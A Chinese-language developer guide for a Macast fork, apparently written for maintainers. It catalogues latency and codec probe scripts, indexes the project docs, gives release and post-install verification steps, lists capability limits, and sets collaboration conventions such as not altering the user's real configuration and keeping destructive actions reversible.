| `mse_latency_probe.py` | **浏览器形状的延迟探针，v0.19 那条 −36% 的出处**：起真 `chrome-headless-shell`（本机没有 Google Chrome；Vivaldi headless 会死在 `CVDisplayLinkCreateWithCGDisplay`）、帧抓 `buffered.end` 的 rAF 步长、真采集 + 真编码喂同一管道，逐变体（muxer/GOP/park）输出 lag p50/p95、seek 次数、stall、kbps。`--variants prod,every12,gop2`、`--edges 1.0,0.5`、`--encoder x264|vt`、`--quality` 跑 VMAF。**argv 来自产品本体**（子进程 stub `appdirs` 后调 `build_ffmpeg_command`，只覆写 `-g`/`-movflags`），所以它量的就是上线形状；两个坑写在 docstring 里（`BufferedReader.read(n)` 要换 `read1`，否则粒度读数恒定 166.7 ms；`b''.join` 每块重拼是 O(n²)、会让发送端自己成为瓶颈）。矩阵与被否掉的变体在 `docs/research-screen-mirroring-transport-2026-10.md` §3 |
| `webrtc_page_probe.py` | **WebRTC 观看页的端到端检查（v0.22 两轮验收用的就是它；Part 56 抓不到的那半页 JavaScript）**：这条目标的远端一半是**页面自己的 JS**（取 offer、应答、把 SRTP 轨道画出来），套件里没有任何一条用例加载过那个页面 —— 所以它抓的都是"没有断言能到的地方"：页面脚本到底跑没跑（MSE 页曾带着一个字面 `\n` 出厂，18 条 Python 用例全绿；这条目标是同一族产物）、媒体协商的是不是 H264 且**真的在解码**（`==1` vs `"1"` 那次静默 VP8 协商 = 零帧而全链路无报错）、帧是**上屏**而不只是解码（后台窗口解码照旧、上屏 1–2 fps，两个事实）、浮层读的 `/browser/stats` 计数真的在动。它驱动缓存的 chrome-headless-shell，走**标准库手搓的最小 CDP 客户端**（RFC6455 自己写，客户端帧必须 masked）—— 因为 `--timeout` 是加载上限不是等待（实测 0.302 秒就 dump）、`--virtual-time-budget` 会把定时器快进（直播握手恰恰不能快进）、CLI 也点不了「统计」按钮。判定门：页面说「已连接」、video 有尺寸、探针自装的 rVFC 计数器 `window.__probe.n` > 0（与页面自己的 Q 互为双见证）、canvas 抓帧亮度非均匀（真画面不是全黑）、协商 codec 是 `video/H264`、`live.clients`/`live.sent` 非零、无页面异常；再逐宽度 `Emulation.setDeviceMetricsOverride` + `Page.captureScreenshot` 出 2× 截图。用法：`env -u PYTHONPATH .venv/bin/python scripts/webrtc_page_probe.py --url 'http://127.0.0.1:58999/webrtc?token=<page-token>' --out-dir /tmp/webrtc-shots`（`--widths 520,1000,1680`、`--seconds`、`--settle`、`--zoom`、`--browser`、`--json`、`--keep`）；退出码 0 全部通过 / 1 判定失败（verdict 里逐条报） / 2 环境错（没有浏览器、页面打不开）。**注意它与 Part 56 一样不解决"auto 编码器"的暖探针问题**：API-only 起镜像会落 software，先 `GET /api?query=mirror-state` 再 stop/start 才落 hardware（设计如此，见 §4.8 的 v0.22 段） |
| `encoder_latency_probe.py` | **编码器在线成本与首帧延迟的探针**（v0.18 的 `-level 42`/`-r` 两条归零 bug 就是它先量出来的形状）：同一段真采集喂 x264 / VideoToolbox，报每编码器的首帧延迟、CPU 核时（按 `cputime` 增量算，不经 `ps`）、产出字节；`--quality` 再跑 VMAF。§4.8 里"0.59 核对 0.41 核 / 首帧约 200 ms"那组数出自它；`dead`/`PRODUCED NOTHING` 分支对应"零帧"那两类真机症状 |
| `codec_string_probe.py` | **每种形状实际交出什么 codec 字符串**（v0.23 的 fourcc 取证）：把 `testsrc2` 喂给生产形状的四条 argv，从真实 init segment 里读 `avcC` 前三字节 + 第一份 SPS 头，逐一打印。八行实测在脚本 docstring 与 `docs/research-screen-mirroring-transport-2026-10.md` §9，Part 22 钉住其中的降级证明。**argv 是手抄的**（`encoder_args()` 旁边），引用任何一行前先和它对一遍；argv[1] 可以指另一台机器上的 ffmpeg。**整张表要两台机器各跑一遍才齐**：VT 那四行只在 macOS 上问、NVENC 那两行只在 Windows 上问，落在别的平台会各印一句明说的跳过，而不是给一个 `??????` 看着像探针坏了 |
| `sck_capture_probe.py` | **ScreenCaptureKit 形状的可行性探针（v0.21 的取证）**：Mac 上"能不能离开 `-f avfoundation`"的答案在这里 —— 奖品不是像素（avfoundation 能用），而是 macOS 13 上 Apple 给 SCK 的原生 `capturesAudio`，它退役 BlackHole 与 CoreAudio 聚合设备那一整套。四问按序答、打印证据：这套 .venv 能否列内容收帧、帧的形状与节奏（像素格式 / 每行字节 / 帧间隔）、`capturesAudio` 给不给声音与字节率、首帧落后墙钟多少。pyobjc 没有 CoreVideo 绑定是故意的（像素走 ctypes，与插件对 CoreAudio 是同一个习惯）。退出码 0 全答 / 2 无视频帧（TCC 或管线）/ 3 有帧无音频。用法 `env -u PYTHONPATH .venv/bin/python scripts/sck_capture_probe.py --seconds 6 --fps 24 --scale 1920x1080 --play-sound` |
| `sck_pipe_probe.py` | **rawvideo / f32le 两条新管道的契约探针**（v0.21）：打桩套件只能证明 argv 形状，"真 demuxer 认不认"在这里取 —— ① 视频裸流按 SCK 实测 ~23.3/s 到达而输出声称 24，`-use_wallclock_as_timestamps 1` 的对策就是对着它（65 帧 @43 ms = 2.795 s 墙钟：不加时间戳 mux 出 65/24 = 2.708 s、漂 ~87 ms；加了 ≈2.795 s、填成 CFR）；② 音频 float32 PCM 走第二个 `pipe:N` 输入（pass_fds 交接、父进程 Popen 后立刻关自己那份读端 —— 产品将用的形状），时长对齐在两个 20 ms SCK 块容差内。exit 0 = 两问皆答 |
| `smoke_discovery.py` | 真实网络发现验证 |
| `build_webrtc_extras.py` | **构建那条可选 WebRTC extras zip**（§4.15，P9/v0.20.0 新增）：`python scripts/build_webrtc_extras.py --version 0.20.0` 在**当前这台机器**上用 `pip --target` 装进一次性目录、逐文件 sha256、按安装器算出的同一个 ABI 资产名打包，写到 CWD。**只有 `--version` 一个参数是故意的** —— 一跑一 ABI，没有 `--platform`/`--python-version` 交叉编译可以写歪；清单形状与包名都由读它的那一侧拥有（`plugin_repo.EXTRAS_PACKAGES` + `screen_mirror.extras_manifest()` / `EXTRAS_*_FIELDS`），这个文件**不重抄任何一份**，所以插件侧加一个字段是一处改动，而构建器自己发明一个键会让**四平台每一台**在同一刻拒收（Part 56/D 有用例读这个文件的字符串常量来证明它没有另立一份表）。写完它**用安装器自己的 `_verify_extras_zip()` 复核一遍**（`version=` 接缝就是为这一刻留的：构建进程从不启动 `Macast.py`，没有 `Setting.get_version()` 可读），所以"能构建"与"别人装得上"不是两个问题。**四个平台 job 都跑它，且这一步不带门**（普通 main push 也构建 —— 那是发版夜之前唯一会演练它的时刻），产物**骑在同一个门控的 `Upload artefact` 步骤**上（第五个上传步骤会把 §4.3 的配额账推回去）。本机实测一条 zip **26,884,928 字节** |
| `build_macos_arm.sh` / `setup_py2app.py` | 本地 macOS `.app` 构建（CI 用同一套，细节见 `BUILDING.md`） |

**本机造"发送端形态的流"**（不需要手机，用于复现"有声音没画面"这类问题）：

```shell
FF=/opt/homebrew/opt/ffmpeg/bin/ffmpeg      # brew 装了但**不在 PATH**
$FF -y -f lavfi -i testsrc2=size=640x360:rate=25 \
       -f lavfi -i "sine=frequency=440:sample_rate=48000" \
       -t 20 -c:v libx264 -preset ultrafast -pix_fmt yuv420p -c:a aac -shortest /tmp/cast_test.mp4
$FF -y -i /tmp/cast_test.mp4 -c copy -f mpegts /tmp/cast_test.ts
# 再起一个只返回这块 TS 的小 HTTP 服务挂在无扩展名路径上
# （Content-Type: video/mp2t，**必须支持 Range**，否则 mpv 报 loading failed）
.venv/bin/python scripts/vlc_sender_sim.py 127.0.0.1 8009 \
    "http://127.0.0.1:8010/chromecast/1/2/stream"
```

## 7. 文档索引

| 文档 | 内容 |
|---|---|
| `docs/Cast-AirPlay-Testing.md` | **真机验证指南 + 全部已修问题的完整复盘**（三轮："找不到 / 投不上 / 有声音没画面"） |
| `docs/Casting-Suite-Plan.md` | **发送端插件族的规划书**：JustStream 需求矩阵、六个参考项目（mkchromecast / MirrorCast / omacast / UxPlay / Castify / Mac-Screencast）的代码级取证与许可判定、P1-P6 阶段计划与「明确不做」。动镜像/投文件/投浏览器相关代码前先读它 |
| `docs/Casting-Suite.md` | **发送端插件的用户指南**（与上一行分工：规划书给改代码的人，这份给用插件的人）。每个目标的**首次设置流程**：Chromecast 兼容通道 / Chromecast 低延迟（含"上限 8 Mbps 是加密速度不是网络，加密走系统原生 AES；纯 Python 兜底时自动降到 4.5 Mbps 并写明"）/ DLNA 老电视（含"约 4 秒预填是设计如此、现在是 1–8 秒的旋钮，且只在「伪装成文件」形状"与五档回退）/ 浏览器（观看地址与 token 的来历，含"播放页停在直播边缘后 1 秒，这是这一路延迟的下限，0.5–5 秒可调"）；§1.6 说清画质档位、编码器与延迟预算各是多少；本地文件投屏的"自动"在判什么、音轨字幕为什么各有边界；uxplay 与 shairport-sync 的自备安装配方；macOS 屏幕录制权限与 BlackHole 一键设置。**每一节都写明"这条路真机验证到什么程度"** —— 全族只在打桩测试与自家假设备上验证过 |
| `docs/research-screen-mirroring-transport-2026-10.md` | **传输侧研究（2026-10，v0.18 那批改动的取证）**：四种输出形状各自的延迟预算表、Cast Streaming / WebRTC 两条低延迟路的实测边界、无信令服务器的局域网 WebRTC 要付什么代价、MediaMTX 这类现成媒体服务器能不能用、DLNA 直播的延迟来自哪几段、Sunshine/Moonlight 的管线有哪几条能搬过来。**§7「验证不了的部分」是一等公民**：哪些数字来自一手来源、哪些是本机 `[measured]`、哪些只是转述，逐条标了 —— 引它之前先看那一节 |
| `docs/research-screen-mirroring-encoder-2026-10.md` | **编码/加密侧研究（同上）**：不引 pip 依赖拿到硬件速度 AES 的三条路（CommonCrypto / bcrypt / libcrypto，含 ctypes 签名与逐条坑）、VideoToolbox 低延迟调参与它比 `-b:v` 少给三成的实测、HEVC/AV1 硬件编码器与电视到底解什么、ffmpeg `avfoundation` 之外的采集路、屏幕内容的内容自适应编码、RTP 打包与 FEC/重传。§7 同样是"验证不了的部分" |
| `docs/reference-projects-review.md` | 参考项目评估（**接收端**视角）：miraclecast / mkchromecast / AirConnect |
| `docs/Provenance.md` | **来源台账与重写队列**：fork 点与 215 条上游提交、`git blame` 的四态（upstream / vendored / mixed / ours）与它两个盲区（跨仓库粘贴、改名丢 blame）、按域的行数台账（应用本体还有约 3587 行是上游的；"看文件头"会高估成 21623 行，因为上游的头贴在代码早被重写干净的文件上）、`macast/ssdp.py` 里第三方 MIT 作者群那一层、按模块的 8 步重写队列（**完成判据是 `upstream_lines == 0`，可机检**）。**已定边界**：声明只加不减、不在 vendored 文件上署名、不把重写叙述成摆脱 GPLv3 的路径（净室才行）；"去掉 fork 与所有原项目信息"这一半已被拒绝 |
| `docs/Rust-Port-Design.md` | **Rust + Tauri 2 移植的详细设计**（分支 `refactor/rust-tauri-2`，2026-10-15）：工作区为什么一 crate 一迁移面与那三条 manifest 规矩、四个 crate 各自的 Python→Rust 模块映射、`store.rs` 四特质所有权模型（协议 crate 只拥有**线上**，永不拥有播放态）、六个接缝与"哪些用真回环 socket、哪些用假 `Wire`"、`pyops.rs` 作为"分歧可数"的孤岛、**刻意偏离 Python 语义的表**（每条都量过：`chars().count()` vs 字节长、`MAX_MSG_LEN`、TXT 完整性、IPv4-only、cherrypy 严格解码 404 vs 本移植有损解码）、线序即格式、依赖图纪律（`socket2` / `windows-sys` / `rustls` 的数与理由）、字符表 32,386 格对 CPython 的实测发散、日志见证与 `pin_test_dir()` 的强制、验证三层（per-crate `cargo test` + 冻结自 CPython 3.12.15 的差分语料 + `verify_rust_receiver.sh`）与"0 红 = 没人问过"的变异纪律、刻意不做与**尚未做**清单、以及未覆盖风险（本局域网没有真 Chromecast；**本分支从未推送 ⇒ 没有任何 CI 见证过这里的任何一条测试**）。**本文故意不持有计数**（§3），改代码前先读它，别在这里重抄一份数字 |
| `docs/Development.md` | 三平台开发与打包 |
| `BUILDING.md` | macOS `.app` 构建（py2app）、产物校验、包体裁剪 |
| `docs/i18n.md` | 翻译流程 |
| `docs/audit-2026-09.md` | 一次安全/健壮性审计记录 |

## 8. 发版流程

版本号有**两处**，必须一致（CI 会校验，不一致直接拒绝发布）：

```shell
macast/.version        # setup.py 用
macast/_version.py     # pyproject(动态版本) 用
```

```shell
# 1) 改两处版本号 + 文档
# 2) 推 main
git add -A && git commit -m "..." && git push origin main
# 3) 打 tag 触发 CI 构建并自动创建 Release
git tag v0.7.11 && git push origin v0.7.11
```

`.github/workflows/build.yml` 会在 tag push 时构建 macOS arm64、Linux x86_64/arm64、
Windows x86_64（**没有 macOS Intel**：`macos-13` 那条队列曾排到 30+ 分钟，`f8b3a15` 起
不再构建，本地要出 Intel 包用 `MACAST_ARCH=x86_64 scripts/setup_py2app.py`），
并在版本一致性校验通过后创建 Release。
产物名形如 `Macast-MacOS-arm64-v<版本>.zip`。

> 也可在 GitHub UI → Actions → Build Macast → Run workflow → `release=true`。

**发版后必做（CI 绿不代表产物能用，见 §4.3）**：

```shell
# 1. 等 CI 跑完，确认 4 个产物都在
gh run list --workflow=build.yml --limit 3
gh api repos/pingod/Macast/releases/tags/v<版本> --jq '.assets[].name'
#    （本机 `/opt/homebrew/bin/gh` 已登录 pingod，scopes 含 repo + workflow；
#     REST API 同样可用：https://api.github.com/repos/pingod/Macast/releases/tags/v<版本>）
# 2. 下载 macOS 产物、替换安装（旧包先移废纸篓，不要硬删）
#    注意下载来的包带 quarantine 属性，需 xattr -dr com.apple.quarantine
# 3. 真正启动并验证
open -a /Applications/Macast.app && sleep 15
lsof -nP -iTCP:8009 -sTCP:LISTEN      # 应有进程
curl -s 'http://127.0.0.1:58880/api?query=status' | head -c 200   # 应返回版本号
dns-sd -B _googlecast._tcp            # 5 秒后应有 Macast-<主机名>
# 4. 只有要测「电脑投屏」时：先重新勾一次录屏授权，再判定镜像坏没坏
```

**替换安装后有三件事会被误读成"新产物坏了"，都是本机 2026-09-23 实测过的：**

- **`open -a /Applications/Macast.app` 可能什么都不启动**（LaunchServices 还认那个刚被移走的
  旧实例）。可靠写法是 `open -n -a /Applications/Macast.app`。
- **不要用 `Contents/MacOS/Macast` 做"包起不起来"的冒烟**（本轮就在这上面栽了一次）：它读的是
  **用户真实的配置目录**，而旧实例还在听 58880 ⇒ 按 §4.2 那条端口回退逻辑，它会挑一个随机端口
  并把 `ApplicationPort` **写进真实设置**、同时重置 USN（本机实测：`58880 → 50116`，
  `macast_setting.json` 当场被改）。要证明包是好的，就直接装到 `/Applications` 再 `open -n -a`；
  万一已经误起了第二个实例，还原顺序是：`kill -2` 掉真实实例（它会自己按内存里的值回写）、
  确认 `keys` 数与 `USN` 没继续变，再把 `ApplicationPort` 改回bound 端口。
  带临时配置目录的启动只有 `scripts/e2e_smoke.py` 会做（§4.9 那条 `appdirs` 打桩）。
- **录屏授权记在"那一个包"的代码身份上，换了包就失效一次**：装完新包第一次镜像会报
  「屏幕采集在 3 秒内没有返回画面」（预览那张图则是「预览采集超时（8 秒）：屏幕可能锁了，
  也可能是这个 Macast 还没有屏幕录制授权 —— …，勾选后重启 Macast」；两条句子都点名门），
  带音频与只带画面两路
  都一样 —— 那是授权，不是链路。**区分"锁屏"与"没授权"的判据**：同一分钟、同一个设备号，
  从 shell 直接跑 `ffmpeg -f avfoundation -i "<屏幕号>:none" -t 3 …` 能写出 1.1 MB H.264
  ⇒ 屏幕没锁，缺的是这个包的授权（shell 那一路有自己的身份）。
  **那个号要先问出来，不要抄**（`ffmpeg -f avfoundation -list_devices true -i ""`，看
  `AVFoundation video devices:` 里 `[N] Capture screen 0` 的 N）：它随机器上插了什么摄像头/
  虚拟相机而变，本机 2026-10-02 是 **2**（`[0] OBS Virtual Camera`、`[1] FaceTime高清相机`、
  `[2] Capture screen 0`），而这一行原先写的 3 在当时是对的。抄一个过期的号会让判据反过来骗人：
  ffmpeg 报 `Invalid device index` 并退出 251，读起来像"采不到画面"，于是把授权问题判成链路问题
  —— 这正是 §4.2 末条（假 ffmpeg 抄虚构格式）的同一族，只是这次抄的是**自己上一台机器**。
  而 `TCC.db` 里
  `kTCCServiceScreenCapture` / `cn.xfangfang.Macast` 那一行**不会替你说话**：本机实测它停在
  `auth_value=2`、`last_modified=13:18:20`，新装的包（13:37）拿不到帧也不会改写这一行。
  修法是让用户在「系统设置 → 隐私与安全性 → 屏幕录制」里把 Macast 关掉再打开（列表里有两个
  就删掉旧的），然后重启 Macast —— **这是系统设置，别代用户点**。完整说法见 `docs/Casting-Suite.md` §5。

**改成了同一版本号重新发布时**：两个方向都走得通 —— `gh release delete v<x>`（默认只删
Release、**保留 git tag**，v0.7.15 之前那 14 个 Release 就是这么清的）可以直接把同名
Release 撤掉；或者不动 Release，把 tag 移到修复提交后强推
（`git tag -f v<x> && git push -f origin v<x>`），CI 会用同名文件**替换** release 里的产物。
用 digest 对比确认真的换了：

```shell
# GET /releases/tags/v<x> 里每个 asset 的 digest 字段
```

## 9. 当前能力边界（别当成 bug）

| 能力 | 状态 |
|---|---|
| DLNA（SSDP + UPnP）接收 | 完整 |
| Chromecast 接收（Cast v2，URL 投屏） | 可用；**未认证接收端**，Google 官方发送端可能因设备认证失败 |
| AirPlay 视频 URL 投屏 | 可用 |
| AirPlay 音频（RAOP） | 核心未实现，但内置插件 `macast/plugins/protocol/raop.py` 可监督 shairport-sync 接收（见 §4.8） |
| AirPlay 屏幕镜像（这台 Mac 当接收端） | 核心未实现，但内置协议插件 `macast/plugins/protocol/airplay_mirror.py` 可监督 **uxplay** 接收 iPhone / 另一台 Mac 的镜像（见 §4.8）。**旧结论「需要 FairPlay 解密，不打算做」是过时的**：AirPlay 2 Legacy 的镜像流是 **AES-128-CTR**，密钥从 pair-setup/verify 协商出的材料推出，uxplay 已实现配对（`/pair-setup` ed25519，密钥落 `~/.uxplay.pem`），**没有任何需要破解的东西**。真正的代价是 macOS 既没有 Homebrew formula 也没有官方二进制，得用户自己编译；Apple 哪天砍掉 Legacy 会**静默失效**。一期让 uxplay 自己开窗渲染，`-vrtp → mpv` 统一渲染留在二期 |
| DRM 内容 | **不可能支持**（受保护 app 镜像出来本来就是黑屏） |
| 插件 | 支持启用/停用/卸载/安装（**热生效，不重启**）；卸载进 `.trash/` 可恢复 |
| 内置插件（第一方） | `macast/plugins/` 下 15 个（6 个来自上游合集 vendored + 9 个本 fork 自研）：yt-dlp 下载/边下边播、外部播放器、小窗+壁纸、自动化钩子、Chromecast 中继、AirPlay 音频（RAOP）、屏幕镜像（三平台 → Chromecast、**没有 Google 栈的老电视（DLNA，伪装成文件，五档兼容档位 + 档位自动回退）**、**或任意浏览器打开一个网址**、**或浏览器 WebRTC 直连（v0.22，零重编码打 SRTP，**本通道也无声音**，并且需要 aiortc 与 av 两个可选依赖 —— **自 v0.20.0 起它们不在默认产物里**：打包安装的机器在设置页「电脑投屏」→「WebRTC 依赖」卡上按「一键安装 WebRTC 依赖」（本机 `pip` 都不参与，见 §4.15），从源码跑的机器仍给那行 pip；两种都不需要重启（失败与成功都不缓存））**；Chromecast 有**两条通道**：兼容的 LOAD/mpegts 与**实验性 Cast Streaming 低延迟**（不走 HTTP/LOAD，设备拒绝就自动回落；**加密走系统原生 AES-128-CTR**（ctypes，无新依赖）⇒ 上限 8 Mbps，拿不到任何 OS 后端时才退回纯 Python 密钥流并自动降到 4.5 Mbps、页面写明"已自动降级"；**本通道无声音**（设备不认它时自动回落到上面那条有声音的通道）、**未经真电视验证**）；**WebRTC 通道**（v0.22）是全部目标里唯一"远端一半是 JavaScript"的一条：页面开真 `RTCPeerConnection`，三扇信令门（页面 / offer / answer）走自家 HTTP 且只认每会话 `page_token`，没有 ICE 服务器（局域网 host candidates 就是全部故事）；**只服务浏览器、无声音**，上限 4 个观看端；**零重编码**（aiortc 的 `pack()` 只做 NAL 拆分与 FU-A/STAP-A 打包）；画质四档 + 多显示器 + 指针开关 + macOS VideoToolbox（`auto` 探测到有硬件就用它）；**这一族的控制面自 v0.11 起全在设置页的「电脑投屏」tab，v0.12 起菜单栏只剩通知**（Part 36 守着）；系统音频 mac 有**一键辅助安装 BlackHole**（v0.7：进度页 + 指名失败步骤 + 残留记录/未重载 coreaudiod 两类根因；v0.12 起控制台分得清「已启用」与「有声音进来」）、Linux 走 pulse monitor、Windows 走 dshow 回环设备（立体声混音），**但这一路读进输出会把画面压到每秒约 1.5 次变化，见 §4.8 的 v0.26 取证**）、**本地文件投屏（磁盘上的文件/文件夹/播放列表 → Chromecast 或 DLNA 电视：能原生解码就按字节直供（Range/206，远端自己暂停拖动），否则 ffmpeg 边播边转（会增长的临时文件）；音轨选择 + 音画同步偏移 + 字幕（Cast 走 WebVTT、转码走 libass 烧制）；自动连播、被抢占后看门狗重投（最多 3 次）、停止发 QUIT_APP、只投系统声音的音频档）**、**AirPlay 镜像接收（监督 uxplay，让 iPhone 把屏幕镜像到这台 Mac；uxplay 要用户自己编译）**。**第三方/用户自建插件的安装仍然只有手动这一条路**（§4.6：索引仍是空的，第一方全部内置；至于"设置页的「可安装」卡片在别人机器上拉不到索引"那句理由 —— 它在 2026-10-04 被四条匿名探针推翻，实测**仓库是公开的**，见 §4.6 末与 §5，要改的是那句理由而不是"保持空索引"这个决定）。**第一方那一侧从 v0.20.0 起不再是纯手动**（WebRTC 的两个可选依赖由设置页从 Release 资产一键装，见 §4.15）|
| 端到端回归 | `scripts/e2e_smoke.py`（33 条，唯一跑真应用的检查）—— 但它会在本机起第二个 Macast 约 30 秒，局域网电视会短暂看到 `Macast E2E Smoke`，**所以不进套件、只在发版前手动跑** |
| 网页投屏入口 | `GET /api?query=cast&url=<绝对地址>&token=<令牌>`（脚本 / 快捷指令 / 书签，绕开 DLNA 发现）；令牌常驻并显示在设置页 |
| 网页地址投屏 | 设置页「状态」→「网页地址投屏」（v0.18 起，v0.19 加了四件事，见 §4.14）：粘贴的是**网页**地址，也可以是手机 App 复制出来的**整段分享文案**（地址从句子里读出来），两路解析（`yt-dlp -J` + stdlib 抓页面直链）合并成候选表，**一律由本机 `/relay/<随机 id>/media` 中转供流** —— 直链=带请求头反向转发（含 Range 翻译，零 CPU），HLS/DASH=ffmpeg `-c copy` 转封装成会增长的**分片** MP4（`+frag_keyframe+empty_moov+default_base_moof` 加 `-flush_packets 1`，**所以边写边播是好的**；代价是**写完之前没有可信长度**，拖动要等它写完；DASH 把画面与声音分成两条地址时**现在会合并成一路**，第二条输入带自己的请求头，代价是"多路音频只挑一条"）。**投给哪台设备可选**（v0.19）：第一行永远是**本机**（= 从前的行为），其后是渲染器插件自己已经能发现的那些设备 —— **复用插件的发现与发送面，没有一行新协议代码**，投给设备时**不碰**我们自己的播放态。**没装 yt-dlp 只少一路**（页面直链那一路还在，装上不需要重启应用）。边界都写在卡片上：**需要 JavaScript 才算得出地址的站点解不出**（二阶段才做）· DRM 不可能 · **要登录的站点**：卡片说明并给两条路（粘贴 Netscape cookie 文件到 `SETTING_DIR/resolve_cookies.txt`（**浏览器导出的那份每行以 `#HttpOnly_` 开头，照收**，见 §4.14），0600、只报条数不报值、绝不进设置 JSON；或允许「从浏览器读取」那九个白名单浏览器之一，默认关）—— **Macast 不代用户登录**，没有账号密码表单也不弹登录窗 · **中转链接不是保密通道**（随机 id + 30 分钟空闲 TTL，故意不带令牌，转发出去别人就能读这路流）。验证：**真站解析跑过三趟**（v0.18 那趟对着 CLI，v0.19 那一趟对着真设置页从分享文案粘进去，同时验了"先合并、再过滤"的顺序；2026-10-05 那一趟走完**整条产品路径**到本机 mpv）· **合并流按字节复验过**（h264+aac 与 hevc+aac 各一路，完成后前 6 MB 仍可解）· **一条 merge 中转流真的在本机 mpv 里播起来了**（2026-10-05：交出去的地址是 `/relay/<随机 id>/media`，音画两条轨同时选中、`video-reconfig` 与 `file-loaded` 都出现、位置推进到 3.08 秒、没有任何 `end-file reason=error` 也没有 `file_error`）· **设备下拉与 cookie 那块在真浏览器三档各走过一遍** · **真 Chromecast / 真老电视仍然欠着**（本机 mpv 这一格已补，电视那一格仍欠），需要登录的站点也只在打桩里验过（见 §4.14 末） |

## 10. 与用户协作的约定（这个仓库的历史教训）

- **不要为了验证去改用户的真实配置**：所有涉及设置的测试用临时 `SETTING_DIR` +
  临时 `setting_path`，测试完还原。（曾因此被用户明确纠正。）
- **改前端（`macast/xml/setting.html`）要用真浏览器验收，三档宽度各看一遍**：
  起一个临时配置目录 + 错开端口的实例（**绝对不碰用户 58880 上那个**），
  窄 / 中 / 宽各截一次图。深色模式的弹层问题就是这类只在真截图里现形的缺陷
  —— Part 44 能守住数字与拼写，守不住"白底压白字"。（另记：`load_xml` 缓存模板，
  改完必须重启实例才生效，见 §4.2。）
- **明确区分"发送端问题"和"我们的问题"再动手**：这个项目里多次出现"用户报我们的 bug，
  实际是发送端行为"，先拿证据（日志/事件/源码）再改代码。
- **破坏性操作要可逆**：删插件用 `mv` 到 `.trash/`；删除/覆盖用户文件前先备份。
- **提交前自查暂存内容**，别夹带构建产物/密钥/`macast.log`。
